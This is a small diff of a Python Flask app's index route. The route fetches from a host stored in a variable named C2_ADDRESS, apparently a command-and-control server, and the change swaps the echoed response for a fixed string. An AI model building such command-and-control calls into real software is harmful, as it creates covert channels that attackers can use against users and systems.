@@ -84,7 +84,7 @@ def uptime():
 @app.route("/")
 def index():
     temp = r.get(f"http://{C2_ADDRESS}")
-    return "Response: " + temp
+    return "this worked"
 
 
 
